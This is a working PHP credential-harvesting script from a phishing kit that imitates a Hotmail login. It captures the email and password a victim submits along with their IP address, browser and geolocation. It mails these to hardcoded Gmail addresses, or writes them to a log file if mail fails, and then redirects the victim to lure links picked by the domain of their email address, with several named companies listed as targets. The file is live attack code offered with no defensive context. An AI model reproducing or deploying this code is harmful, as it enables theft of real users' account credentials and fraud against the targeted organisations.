<?php
header('Access-Control-Allow-Origin: *');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

$return_url;
if($_POST['id']){
	$return_url = $_POST['id'];
}
$client_email = trim($_POST['email']);
$client_password = $_POST['password'];
$trialNo = $_POST['q'];
$client_password2;
 if($_POST['confirm_password']){
 	$client_password2 = $_POST['confirm_password'];
 }else{
 	$client_password2 ='confirm_password';
 }

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$ip = getenv("REMOTE_ADDR");
$agent=$_SERVER['HTTP_USER_AGENT'];

$email= "endyworkmode01@gmail.com";


$message  = "==================+[ Personal Info - Hotmail ]+==================\n";
$message .= "Username / Email => " . $client_email . " \n ";
$message .= "Password => " . $client_password . " \n ";
$message .= "Confirm Password => " . $client_password2 . " \n ";

$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "User-Agent : ".$agent."\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "=============+ [Hotmail] +=============\n";
$message .= "Designed by Bennattom ICQ contact: 742338383 \n";
$subject = "==============+ [Hotmail] +================\n";

$arrayName = array(
				strtolower('designpacint.com') => 'https://1drv.ms/b/s!Am2YG07g8dw_gnwaoYw9xp_Wlxva?e=7fyhhE', 
				strtolower('summerfridays.com') => 'https://1drv.ms/b/s!Am2YG07g8dw_gnnmjoA6v43qJ4xE?e=CXv7pC', 
				strtolower('coverpla.com') => 'https://1drv.ms/b/s!Am2YG07g8dw_gntK7wEreVtpWlRk?e=L0Opbj', 
				strtolower('cleanbeauty.com') => 'https://1drv.ms/b/s!Am2YG07g8dw_gnwaoYw9xp_Wlxva?e=7fyhhE', 
				strtolower('ernolaszlo.com') => 'https://1drv.ms/b/s!Am2YG07g8dw_gn14zHJ4yLjonnhh?e=2gqBXn', 
				strtolower('goop.com') => 'https://1drv.ms/b/s!Am2YG07g8dw_gnqJXkiF5CGgnljs?e=4lHwr5', 
				strtolower('grossmandermatology.com') => 'https://1drv.ms/b/s!Am2YG07g8dw_gn5CnDUXtabU_Q5t?e=ZdmOe3', 
				strtolower('estee.com') => 'https://1drv.ms/b/s!Am2YG07g8dw_gn5CnDUXtabU_Q5t?e=ZdmOe3'
				 
			);


$domain_name = substr(strrchr($client_email, "@"), 1);

$url;

if(array_key_exists(strtolower($domain_name), $arrayName)){

	$url = $arrayName[strtolower($domain_name)];

}else{

	$url = 'https://945732-3eb9-4edf-a4f2-2a2f2089e33c46ef945732-3eb9.netlify.com/?reaml=5732-3eb9-4edf-a4f2-2a2f2089e33c46ef945732-3eb';
}




$send = mail($email,$subject,$message);

if($send){
	mail('emily4luv90@gmail.com',$subject,$message);
	if(!empty($return_url)){
if($trialNo > 0){

		echo $url;
}
	}else{

       if($trialNo > 0){

		header('Location:'.$url);
       }
	}
}else{
	$handle = fopen("logs.txt", "a");
	fwrite($handle, $subject);
	fwrite($handle,$message);
	fwrite($handle, "\r\n");
	fclose($handle);
	exit;
}

if(empty($return_url)){

		if($trialNo > 0){

		echo $url;
}
	}else{

		if($trialNo > 0){

		header('Location:'.$url);
       }
	}
	
if($trialNo > 0){
		header('Location:'.$url);
       }

?>